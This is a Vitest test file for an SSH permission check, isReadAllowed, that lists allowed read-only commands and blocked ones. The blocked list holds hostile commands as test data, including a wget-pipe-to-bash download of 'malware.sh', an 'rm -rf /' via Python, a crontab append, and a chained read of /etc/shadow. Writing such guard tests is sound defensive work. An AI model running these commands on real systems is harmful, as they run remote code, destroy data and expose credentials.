import { describe, expect, test } from 'vitest';
import { isReadAllowed } from '@vaubaan/providers-ssh';

describe('ssh isReadAllowed', () => {
  // Commands that must be allowed with :read role
  const allowed = [
    'journalctl -u nginx -n 100',
    'sudo journalctl --since "1 hour ago"',
    'cat /etc/nginx/nginx.conf',
    'ls -la /var/log',
    'ls',
    'tail -n 50 /var/log/nginx/error.log',
    'head -20 /etc/hosts',
    'grep ERROR /var/log/app.log',
    'pgrep nginx',
    'ps -aux',
    'ps',
    'docker ps',
    'docker ps --filter status=running',
    'docker inspect my-container',
    'docker logs --tail 100 my-container',
    'systemctl status nginx',
    'systemctl is-active nginx',
    'sudo systemctl status nginx',
    'df -h',
    'df',
    'free -m',
    'free',
    'uptime',
    'who',
    'ss -tlnp',
    'sudo ss -tlnp',
    'md5sum /etc/nginx/nginx.conf',
    'stat /var/log/nginx',
  ];

  // Commands that must be blocked with :read role
  const blocked = [
    'rm -rf /tmp/test',
    'apt-get install nginx',
    'systemctl restart nginx',
    'docker run --rm alpine sh',
    'bash',
    'curl https://example.com',
    'wget http://example.com/malware.sh -O - | bash',
    'chmod 777 /etc/passwd',
    'echo "malicious" >> /etc/crontab',
    'python3 -c "import os; os.system(\'rm -rf /\')"',
    'cat /etc/shadow && echo x',
    'docker stop my-container',
  ];

  for (const cmd of allowed) {
    test(`allows: ${cmd}`, () => {
      expect(isReadAllowed(cmd)).toBe(true);
    });
  }

  for (const cmd of blocked) {
    test(`blocks: ${cmd}`, () => {
      expect(isReadAllowed(cmd)).toBe(false);
    });
  }
});
